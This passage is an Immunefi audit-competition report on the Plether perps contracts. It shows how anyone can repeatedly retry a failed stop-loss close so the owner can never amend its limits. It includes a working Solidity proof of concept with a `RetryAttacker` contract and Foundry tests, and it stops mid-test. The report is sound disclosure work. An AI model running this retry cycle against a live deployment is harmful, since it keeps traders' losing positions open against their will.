# \#98655 [SC-High] Permissionless protection retry lets anyone block the owner's limit amendment and keep a triggered stop-loss open

**Submitted on Nov 9th 2026 at 10:03:07 UTC by @kiings91 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98655
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When a triggered stop-loss or take-profit cannot close because the close exceeds a limit the owner set, the protection relatches and the owner is expected to raise the limit and retry. That is the remedy the team relies on in its fix for Cecuro MED-9. But `retryPositionProtectionClose` is permissionless, and anyone can execute the failing close and retry it in one transaction, which keeps the protection out of the only state in which the owner may amend. In the PoC the owner's amendment reverts on every cycle for more than an hour while the position stays open and its loss grows from 1,000 to at least 2,500 USDC.

## Vulnerability Details

All code references are to commit `a82d4fe`; links are under References.

A position protection that has triggered commits a close "child" order. The child copies the four close limits the owner set on the protection (`OrderLiquidationBatchLogic.commitProtectionChild`, L663-L677). If the close would exceed one of those limits, the policy evaluator rejects it with `ConstraintViolation` (`CfdOrderPolicyEvaluatorBase`, L496-L516), the sidecar classifies that error as terminal (`OrderRouterExecutionSidecar`, L879-L892), and the position is left open.

On a terminal failure the router calls `handleFailedProtectionAttempt`, which sets the protection back to `Latched` and deletes the attempt (`PositionProtectionBook`, L637-L667). `_deleteOrder` then brings the account's pending-order count back to zero (`OrderRouterBase`, L133-L135). So after the child fails, the protection is `Latched` with no pending order.

Two entry points act on that state:

1. The owner may raise the limits with `amendLatchedPositionProtectionCloseLimits`, but only while the protection is `Latched` and the account has no pending order (`PositionProtectionBook`, L315-L328). In any other protection state it reverts with `OrderRouter__ProtectionNotLatched`.
2. Anyone may call `retryPositionProtectionClose` (`PositionProtectionBook`, L382-L406). It looks the protection up with `_activeProtection` (L993-L1000), which has no owner check, and there is no cooldown or attempt cap. It commits a fresh child and sets the protection back to `Triggered` with one pending order.

The book and the router each take their own reentrancy lock, so a single external call can execute the failing child and then call `retryPositionProtectionClose`. After that transaction the protection is `Triggered` again with a new pending child, and the owner's amendment window never opens. While the protection is in that state, the owner has no other way out:

- cancel and cancel-and-close require `Armed` (`PositionProtectionBook`, L346, L414-L419);
- an ordinary close reverts with `ProtectionActive` (`OrderLiquidationBatchLogic`, L135, L313-L315);
- `expireOrder` only works after the child's deadline.

The attacker does not need to wait between cycles. A child can execute in the first block after its commit that carries a price published after the commit time (`OrderRouterExecutionSidecar`, L445-L453), so the attacker can execute and retry as soon as each new child becomes executable.

This is an incomplete fix of Cecuro MED-9, "Keepers can retry protection closes without the trader's financial limits" (Acknowledged). The fix copies the owner's ceilings into every permissionless retry and lets only the owner amend them while the protection is `Latched`. The team's response accepts that "Tight limits may prevent execution until conditions improve or the owner amends them", and the repository docs say the owner "may amend its limits before retrying" (`WORKING_WITH_AI_AGENTS.md`, L284; `CANONICAL_ENTRYPOINTS.md`, L145-L147). I'm not arguing against the ceilings or against permissionless retries. The problem is that the owner's amendment, the remedy the fix relies on, can be taken away by any third party for as long as it keeps retrying. The program's Known Issues accept a report on an Acknowledged root cause when it shows that the fix at `a82d4fe` is incomplete.

The repository's own test shows the gate: after a third party (`CAROL`) retries, the owner's amendment reverts with `OrderRouter__ProtectionNotLatched` (`test/perps/spec/trader/PositionProtection.t.sol`, L990-L996, with the same 1e6 execution-notional ceiling as the PoC at L958). What the test does not show is that the retry can be repeated atomically after every failed child, which turns a one-off race into a lock.

This is also not the keeper-liveness limitation in `SECURITY.md`. L1356-L1359 say that latched protections depend on keepers separately appending a retry, and L1345 that users cannot manually cancel queued intents. Neither covers a third party repeatedly consuming the owner's amendment window.

Two conditions bound the issue, and the PoC covers both:

- The lock depends on transaction ordering. If the owner's correcting transaction lands first, it succeeds. A smart-wallet owner that executes the child, amends and retries in one transaction raises the ceiling, and the next child closes the position (PoC `test_batchingOwnerWinsIfFirst`). The attacker must win every cycle; the owner needs to win once. An ordinary EOA owner cannot batch and has no same-block counter: if the attacker's execute-and-retry lands first, its bare amendment reverts and its own execution of the fresh child returns `Pending` (PoC `test_eoaOwnerCannotEscape`).
- The lock needs live oracle mode. While the oracle is frozen (the weekend FX close, `PletherOracle` L508-L513), the same-block and MEV-boundary checks are skipped. A smart-wallet owner's batch then executes the fresh child at once and escapes even right after the attacker's transaction (PoC `test_frozenWindowBreaksLock`).

## Impact Details

Medium: griefing. The attacker gains nothing. While it keeps winning the per-cycle race in live oracle mode, the owner of a triggered stop-loss or take-profit can neither correct it nor exit the position. The position stays fully open while the market moves, so the owner carries the losses the protection was meant to stop. The owner's free margin stays withdrawable subject to the health check, so I do not claim a freeze of funds.

In the PoC, with the release parameters and a live oracle, the attacker holds the lock for 3,750 seconds over 75 cycles. On every cycle the owner's amendment reverts with `OrderRouter__ProtectionNotLatched`, the protection stays `Triggered` with one pending child, and the LONG position's size is unchanged. The price moves from 1.10 to 1.25 against the owner, and the position's unrealized result falls from -1,000 USDC to -2,500 USDC or worse while the stop-loss never closes.

Cost and likelihood: the attacker pays gas and the Pyth update fee for each child it executes, and close children carry no execution bounty, so it earns nothing back. Holding the lock means winning ordering on every cycle. On Arbitrum One that is a latency race under the default first-come-first-served ordering. With Timeboost, which is live on Arbitrum One, the holder of the express lane gets a 200 ms head start over every other transaction in that 60-second round, so an hour-long lock means buying about 60 consecutive rounds. Because the owner needs only one winning transaction, and a batching owner escapes in any frozen window, I rate this Medium rather than higher.

## References

Code at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8:
- `PositionProtectionBook.amendLatchedPositionProtectionCloseLimits`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328
- `PositionProtectionBook.retryPositionProtectionClose`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406
- `PositionProtectionBook.handleFailedProtectionAttempt`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L667
- `OrderLiquidationBatchLogic.commitProtectionChild` (close-limit copy): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L663-L677
- `CfdOrderPolicyEvaluatorBase` ConstraintViolation: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L496-L516
- `OrderRouterExecutionSidecar` terminal classification: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L879-L892
- `OrderRouterExecutionSidecar` same-block and MEV-boundary checks: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L445-L453
- `OrderRouterBase._deleteOrder` (pending-count decrement): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderRouterBase.sol#L133-L135
- `PletherOracle.isOracleFrozen` (frozen window): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L508-L513
- Repository test (owner amendment reverts after a third-party retry): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/trader/PositionProtection.t.sol#L990-L996 (1e6 ceiling at L958)

Prior audit:
- Cecuro AI audit, MED-9 and the team's response: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf

Documentation:
- WORKING_WITH_AI_AGENTS.md L284: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md?plain=1#L284
- CANONICAL_ENTRYPOINTS.md L145-L147: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L145-L147
- SECURITY.md L1345-L1359: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1345-L1359
- Arbitrum Timeboost: https://docs.arbitrum.io/how-arbitrum-works/timeboost

## Proof of Concept

## Proof of Concept

Steps (the owner's LONG has a stop-loss whose close-notional ceiling is below the position's notional; the attacker is an unprivileged contract, `RetryAttacker`, called the keeper in the test comments):

1. The price reaches the stop-loss. The protection triggers and commits a close child that copies the owner's ceiling.
2. In one transaction, the attacker executes the child, which fails with `ConstraintViolation` and relatches the protection, and then calls `retryPositionProtectionClose`, which commits a fresh child.
3. The owner calls `amendLatchedPositionProtectionCloseLimits` to raise the ceiling. It reverts with `OrderRouter__ProtectionNotLatched`, because the protection is `Triggered` again.
4. The attacker repeats step 2 as soon as each new child is executable, while the price keeps moving against the owner.

The test uses the repository's `BasePerpTest` fixture with the release parameters from `DEPLOYMENT.md` and the contracts' defaults (for example the 0.01e18 VPI factor, 4 bps execution fee, 50 bps frozen close spread, 25% adverse confidence multiplier and 60-second execution window). Only Pyth and USDG are mocked, and no contract is changed. Put the file at `packages/perps/test/perps/ProtectionAmendStarvation.t.sol` and, from `packages/perps`, run:

```sh
forge test --match-path test/perps/ProtectionAmendStarvation.t.sol -vv
```

Results on `a82d4fe` (4 passed, 0 failed):

- `test_lockSurvivesOneHour` runs steps 2 and 3 for 75 cycles over 3,750 seconds. After every cycle it asserts that the owner's amendment reverts with `OrderRouter__ProtectionNotLatched`, that the protection is `Triggered` with one pending child, and that the position size has not changed. At the end it asserts that the price has moved from 1.10 to 1.25 and that the unrealized result has fallen from -1,000 USDC to -2,500 USDC or worse.
- `test_batchingOwnerWinsIfFirst`: when a smart-wallet owner's batch (execute, amend, retry) lands first, the ceiling is raised and the next child closes the position (size 0).
- `test_eoaOwnerCannotEscape`: when the attacker's transaction lands first, a plain EOA owner's amendment reverts, and its own execution of the fresh child in the same block returns `Pending`. In the control branch, where nobody retries, the EOA amends, retries and the position closes.
- `test_frozenWindowBreaksLock`: when the oracle freezes (Friday close) during the child's life, the same-block check no longer applies, so the smart-wallet owner's batch, run in the same block as the attacker's cycle, amends and closes the position.

The 50-second step between cycles only shortens simulated time; a real attacker does not have to wait (see Vulnerability Details).

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IExecuteOrder {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata data
    ) external payable returns (OrderV3Types.ExecutionResult memory);

}

/// @dev Unprivileged keeper: in one transaction, execute the pending child (it fails terminally on the owner's
///      close ceiling) and then commit a fresh child through the permissionless retry.
contract RetryAttacker {

    function cycle(
        IExecuteOrder router,
        IPositionProtectionActions book,
        uint64 child,
        uint64 pid,
        bytes[] calldata data
    ) external payable returns (OrderV3Types.ExecutionResult memory res, uint64 newChild) {
        res = router.executeOrder{value: 1}(child, data);
        newChild = book.retryPositionProtectionClose(pid);
    }

    receive() external payable {}

}

/// @dev Position owner as a smart wallet that can execute the child, amend and retry in one transaction.
contract BatchingOwnerWallet {

    function ownerBatch(
        IExecuteOrder router,
        IPositionProtectionActions book,
        uint64 child,
        uint64 pid,
        PositionProtectionTypes.CloseFinancialLimits calldata limits,
        bytes[] calldata data
    ) external payable returns (OrderV3Types.ExecutionResult memory res, uint64 newChild) {
        res = router.executeOrder{value: 1}(child, data);
        book.amendLatchedPositionProtectionCloseLimits(pid, limits);
        newChild = book.retryPositionProtectionClose(pid);
    }

    receive() external payable {}

}

/// @title ProtectionAmendStarvationTest
/// @notice A triggered position protection whose close child fails terminally on the owner's finite close ceiling
///         is relatched, and `retryPositionProtectionClose` is permissionless. A keeper that executes the child and
///         retries in one transaction keeps the protection `Triggered` with one pending child, so the owner never
///         observes the Latched/no-pending state that `amendLatchedPositionProtectionCloseLimits` requires.
contract ProtectionAmendStarvationTest is BasePerpTest {

    address internal constant KEEPER = address(0xCEE034);

    uint256 internal constant SL_PRICE = 1.1e8;
    /// @dev Adverse price drift per cycle (0.002 per cycle, 75 cycles: 1.10 -> 1.25).
    uint256 internal constant STEP_PRICE = 2e5;
    /// @dev The step only compresses simulated time; a child can execute from the first block after its commit that
    ///      carries a price published after the commit (OrderRouterExecutionSidecar.sol:447-452), so a bot does not
    ///      need to wait 50 s.
    uint256 internal constant STEP_TIME = 50;
    uint256 internal constant CYCLES = 75; // 75 * 50 s = 3750 s > 3600 s

    /// @dev Friday 2026-01-09 21:59:10 UTC = 16:59:10 New York (EST). The oracle freezes at 17:00:00 NY (22:00 UTC).
    uint256 internal constant FRI_BEFORE_CLOSE = 1_767_995_950;
    uint256 internal constant FRI_FREEZE = 1_767_996_000;

    IPositionProtectionActions internal actions;
    IPositionProtectionViews internal views_;
    BatchingOwnerWallet internal ownerWallet;
    RetryAttacker internal attacker;
    address internal eoa;
    uint256 internal nonce_;

    // ------------------------------------------------------------------------------------------------------------
    // Release-like configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 2_000_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 2_000_000e6;
    }

    function setUp() public virtual override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8_000);

        ICfdEngineAdminHost.EngineRiskConfig memory risk = _engineRiskConfig();
        risk.executionFeeBps = 4;
        risk.frozenCloseSpreadBps = 50;
        risk.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(risk);
        vm.warp(block.timestamp + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();

        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2_500;
        routerConfig.minOpenNotionalAssets = 1_000e6;
        routerConfig.maxPendingOrders = 5;
        routerConfig.maxExecutionWindowSeconds = 60;
        routerConfig.positionProtectionTriggerBountyAssets = 200_000;
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(routerAdmin.routerConfigActivationTime());
        routerAdmin.finalizeRouterConfig();

        juniorVault.proposeMaintenanceFeeConfig(0, PROTOCOL_TREASURY_ACCOUNT);
        vm.warp(juniorVault.maintenanceFeeConfigActivationTime());
        juniorVault.finalizeMaintenanceFeeConfig();

        // Move the clock to a market-open weekday: Tue 2024-03-19 06:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 15 days);

        engine.checkpointCarryIndexes();
        vm.deal(KEEPER, 1_000 ether);

        actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        views_ = IPositionProtectionViews(address(router.positionProtectionBook()));
        ownerWallet = new BatchingOwnerWallet();
        attacker = new RetryAttacker();
        eoa = makeAddr("eoaOwner");
        vm.deal(address(ownerWallet), 10 ether);
        vm.deal(address(attacker), 10 ether);
        vm.deal(eoa, 10 ether);
        _fundTrader(address(ownerWallet), 1_000_000e6);
        _fundTrader(eoa, 1_000_000e6);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------------------------------------------------

    function _target(
        CfdTypes.Side side,
        bool isClose
    ) internal pure returns (uint256) {
        return (isClose == (side == CfdTypes.Side.LONG)) ? 2e8 : 1;
    }

    function _req(
        CfdTypes.Side side,
        uint256 lots,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = bytes32(++nonce_);
        r.side = side;
        r.sizeDelta = lots * 1e20;
        r.marginDelta = margin;
        r.isClose = isClose;
        r.targetPrice = _target(side, isClose);
        r.bounds = OrderV3Types.ExecutionBounds(
            uint64(vm.getBlockTimestamp() + 60),
            60,
            7,
            router.lifecycleBook().currentExecutionConfigHash(),
            type(uint256).max,
            type(uint256).max,
            type(uint256).max,
            type(uint256).max,
            type(uint256).max,
            type(uint256).max,
            0,
            0,
            type(uint32).max
        );
    }

    function _payloadAt(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](2);
        for (uint256 i; i < 2; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: bytes32(i + 1),
                price: MockPyth.MockPrice({
                    price: int64(int256(price)),
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _livePayload(
        uint256 price
    ) internal view returns (bytes[] memory) {
        return _payloadAt(price, block.timestamp);
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _openLong(
        address who
    ) internal {
        OrderV3Types.OrderRequest memory r = _req(CfdTypes.Side.LONG, 100, 5_000e6, false);
        vm.prank(who);
        uint64 id = router.commitOrder(r);
        _nextBlock();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory res = router.executeOrder{value: 1}(id, _livePayload(1e8));
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
        assertEq(uint8(res.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "open reason Executed");
    }

    function _pos(
        address who
    ) internal view returns (uint256 size, uint256 margin, int256 vpi, CfdTypes.Side side) {
        (size, margin,,, side,, vpi) = engine.positions(who);
    }

    function _status(
        uint64 pid
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return views_.getPositionProtection(pid).status;
    }

    function _limits(
        uint256 notional
    ) internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l = PositionProtectionTypes.CloseFinancialLimits(notional, type(uint256).max, type(uint256).max, type(uint256).max);
    }

    /// @dev LONG 100 lots opened at 1.0, protection with stop-loss trigger 1.1 and a finite notional ceiling
    ///      (1e6 = $1) that any real close exceeds, so the child fails ConstraintViolation instead of closing.
    function _armCeilinged(
        address who
    ) internal returns (uint64 pid) {
        _openLong(who);
        _nextBlock();
        router.updateMarkPrice{value: 1}(_livePayload(1e8));
        PositionProtectionTypes.PositionProtectionParams memory p;
        p.takeProfitTriggerPrice = 0.9e8;
        p.stopLossTriggerPrice = SL_PRICE;
        p.closeLimits = _limits(1e6);
        vm.prank(who);
        pid = actions.createPositionProtection(p);
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Armed), "armed");
    }

    function _trigger(
        address who,
        uint64 pid,
        uint256 price
    ) internal returns (uint64 child) {
        _nextBlock();
        vm.prank(address(attacker));
        child = actions.triggerPositionProtection{value: 1}(pid, _livePayload(price));
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "Triggered");
        assertEq(router.pendingOrderCounts(who), 1, "child pending");
    }

    function _unrealized(
        address who,
        uint256 price
    ) internal view returns (int256) {
        (uint256 size,,,) = _pos(who);
        return engineLens.previewClose(who, size, price).realizedPnlAssets;
    }

    // ------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------

    /// @notice A keeper that executes the failing child and retries in one transaction, once per 50 s step, keeps the
    ///         owner's amendment reverting with `ProtectionNotLatched` for over an hour while the loss grows.
    function test_lockSurvivesOneHour() public {
        address ownerAddr = address(ownerWallet);
        uint64 pid = _armCeilinged(ownerAddr);
        uint256 price = SL_PRICE;
        uint64 child = _trigger(ownerAddr, pid, price);
        (uint256 size0,,,) = _pos(ownerAddr);
        assertGt(size0, 0, "position open");
        uint256 t0 = vm.getBlockTimestamp();
        int256 pnlStart = _unrealized(ownerAddr, price);
        uint256 childCommitTime = vm.getBlockTimestamp();
        uint64 firstChild = child;

        for (uint256 i; i < CYCLES; ++i) {
            vm.warp(vm.getBlockTimestamp() + STEP_TIME);
            vm.roll(vm.getBlockNumber() + 1);
            price += STEP_PRICE;

            // The oracle only accepts a price published after the child's commit time; the keeper supplies the
            // first executable price (publishTime = commitTime + 1) and executes before the child's deadline.
            bytes[] memory payload = _payloadAt(price, childCommitTime + 1);
            childCommitTime = vm.getBlockTimestamp(); // commit time of the child retried inside this cycle
            vm.prank(address(attacker));
            (OrderV3Types.ExecutionResult memory res, uint64 newChild) =
                attacker.cycle(IExecuteOrder(address(router)), actions, child, pid, payload);
            assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Failed), "child Failed");
            assertEq(
                uint8(res.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "ConstraintViolation"
            );
            assertEq(newChild, child + 1, "fresh child committed");
            child = newChild;

            // the owner's amendment reverts on the not-latched guard
            vm.prank(ownerAddr);
            vm.expectRevert(abi.encodeWithSignature("OrderRouter__ProtectionNotLatched()"));
            actions.amendLatchedPositionProtectionCloseLimits(pid, _limits(type(uint256).max));

            assertEq(
                uint8(_status(pid)),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "Triggered after cycle"
            );
            assertEq(router.pendingOrderCounts(ownerAddr), 1, "one pending child");
            assertEq(views_.getPositionProtection(pid).linkedOrderId, child, "linked to fresh child");

            (uint256 size,,,) = _pos(ownerAddr);
            assertEq(size, size0, "position size unchanged");
        }

        assertGt(vm.getBlockTimestamp() - t0, 3600, "lock held more than one hour");
        assertEq(price, SL_PRICE + CYCLES * STEP_PRICE, "price moved 1.10 -> 1.25");
        assertEq(child - firstChild, CYCLES, "one child burned per cycle");
        int256 pnlEnd = _unrealized(ownerAddr, price);
        assertEq(pnlStart, -1_000e6, "unrealized result at trigger price");
        assertLe(pnlEnd, -2_500e6, "unrealized result at final price");
        (uint256 sizeEnd,,,) = _pos(ownerAddr);
        assertEq(sizeEnd, size0, "position still fully open");
    }

    /// @notice When the owner's batched execute + amend + retry lands before the keeper, the amendment takes effect
    ///         and the amended child closes the position.
    function test_batchingOwnerWinsIfFirst() public {
        address ownerAddr = address(ownerWallet);
        uint64 pid = _armCeilinged(ownerAddr);
        uint64 child = _trigger(ownerAddr, pid, SL_PRICE);
        _nextBlock();

        (OrderV3Types.ExecutionResult memory res, uint64 newChild) = ownerWallet.ownerBatch(
            IExecuteOrder(address(router)), actions, child, pid, _limits(type(uint256).max), _livePayload(SL_PRICE)
        );
        assertEq(uint8(res.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "child failed first");
        assertEq(newChild, child + 1, "fresh child committed with amended limits");
        assertEq(views_.closeFinancialLimits(pid).maxExecutionNotionalAssets, type(uint256).max, "amend took effect");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "Triggered again");

        _nextBlock();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r2 =
            IExecuteOrder(address(router)).executeOrder{value: 1}(newChild, _livePayload(SL_PRICE));
        assertEq(uint8(r2.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended child executed");
        (uint256 size,,,) = _pos(ownerAddr);
        assertEq(size, 0, "position closed");
    }

    /// @notice An EOA owner cannot execute, amend and retry in one transaction. After the keeper's atomic cycle the
    ///         amendment reverts and a same-block execution of the fresh child stays pending; without the keeper's
    ///         retry the EOA amends successfully.
    function test_eoaOwnerCannotEscape() public {
        uint64 pid = _armCeilinged(eoa);
        uint64 child = _trigger(eoa, pid, SL_PRICE);
        (uint256 size0,,,) = _pos(eoa);
        assertGt(size0, 0, "position open");
        _nextBlock();
        uint256 snap = vm.snapshotState();

        // (a) the keeper's atomic execute + retry lands first
        vm.prank(address(attacker));
        (OrderV3Types.ExecutionResult memory res, uint64 newChild) =
            attacker.cycle(IExecuteOrder(address(router)), actions, child, pid, _livePayload(SL_PRICE));
        assertEq(uint8(res.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "(a) CV");
        assertEq(newChild, child + 1, "(a) fresh child");
        vm.prank(eoa);
        vm.expectRevert(abi.encodeWithSignature("OrderRouter__ProtectionNotLatched()"));
        actions.amendLatchedPositionProtectionCloseLimits(pid, _limits(type(uint256).max));
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "(a) Triggered");
        assertEq(router.pendingOrderCounts(eoa), 1, "(a) pending child");
        assertEq(views_.closeFinancialLimits(pid).maxExecutionNotionalAssets, 1e6, "(a) limits unchanged");
        vm.prank(eoa);
        OrderV3Types.ExecutionResult memory same =
            IExecuteOrder(address(router)).executeOrder{value: 1}(newChild, _livePayload(SL_PRICE));
        assertEq(uint8(same.status), uint8(OrderV3Types.LifecycleStatus.Pending), "(a) same-block exec: child Pending");
        (uint256 sizeA,,,) = _pos(eoa);
        assertEq(sizeA, size0, "(a) position still open");

        // (b) without the keeper's retry the EOA executes, amends in a separate transaction, and escapes
        vm.revertToState(snap);
        vm.prank(eoa);
        OrderV3Types.ExecutionResult memory eres =
            IExecuteOrder(address(router)).executeOrder{value: 1}(child, _livePayload(SL_PRICE));
        assertEq(uint8(eres.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "(b) CV");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "(b) Latched");
        assertEq(router.pendingOrderCounts(eoa), 0, "(b) zero pending");
        vm.prank(eoa);
        actions.amendLatchedPositionProtectionCloseLimits(pid, _limits(type(uint256).max));
        assertEq(views_.closeFinancialLimits(pid).maxExecutionNotionalAssets, type(uint256).max, "(b) amend took effect");
        uint64 retried = actions.retryPositionProtectionClose(pid);
        _nextBlock();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r2 =
            IExecuteOrder(address(router)).executeOrder{value: 1}(retried, _livePayload(SL_PRICE));
        assertEq(uint8(r2.status), uint8(OrderV3Types.LifecycleStatus.Executed), "(b) amended child executed");
        (uint256 sizeB,,,) = _pos(eoa);
        assertEq(sizeB, 0, "(b) position closed");
    }

    /// @notice Crossing the Friday oracle freeze inside the child's life removes the same-block/MEV boundary, so the
    ///         batching owner can execute, amend and retry in the same block as the keeper's cycle and escape.
    function test_frozenWindowBreaksLock() public {
        address ownerAddr = address(ownerWallet);
        // open and arm at 16:20 NY, before the 16:30 window that makes new opens close-only
        vm.warp(FRI_FREEZE - 40 minutes);
        vm.roll(vm.getBlockNumber() + 1);
        assertFalse(engine.isFadWindow(), "pre-FAD");
        uint64 pid = _armCeilinged(ownerAddr);
        // trigger 20 s before the freeze
        vm.warp(FRI_BEFORE_CLOSE);
        vm.roll(vm.getBlockNumber() + 1);
        assertFalse(engine.isOracleFrozen(), "pre-close: not frozen");
        assertTrue(engine.isFadWindow(), "inside FAD");
        uint64 child = _trigger(ownerAddr, pid, SL_PRICE);
        assertLt(vm.getBlockTimestamp(), FRI_FREEZE, "trigger committed before freeze");
        (uint256 size0,,,) = _pos(ownerAddr);
        assertGt(size0, 0, "position open");

        // cross into the frozen window, still inside the child's 60 s deadline
        vm.warp(FRI_FREEZE + 5);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "oracle frozen");
        assertTrue(pletherOracle.isOracleFrozen(), "oracle contract reports frozen");

        // the keeper moves first: execute the child (fails on the owner's ceiling), retry
        vm.prank(address(attacker));
        (OrderV3Types.ExecutionResult memory res, uint64 newChild) =
            attacker.cycle(IExecuteOrder(address(router)), actions, child, pid, _livePayload(SL_PRICE));
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Failed), "keeper: child Failed");
        assertEq(uint8(res.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "keeper: CV");
        assertEq(newChild, child + 1, "fresh child committed");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "re-Triggered");
        assertEq(router.pendingOrderCounts(ownerAddr), 1, "one pending child");

        // a bare amendment still reverts right after the keeper's transaction
        vm.prank(ownerAddr);
        vm.expectRevert(abi.encodeWithSignature("OrderRouter__ProtectionNotLatched()"));
        actions.amendLatchedPositionProtectionCloseLimits(pid, _limits(type(uint256).max));

        // the owner's batch in the same block wins: the fresh child is executable immediately while frozen
        (OrderV3Types.ExecutionResult memory ores, uint64 ownerChild) = ownerWallet.ownerBatch(
            IExecuteOrder(address(router)), actions, newChild, pid, _limits(type(uint256).max), _livePayload(SL_PRICE)
        );
        assertEq(uint8(ores.status), uint8(OrderV3Types.LifecycleStatus.Failed), "owner: pending child failed");
        assertEq(uint8(ores.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "owner: CV");
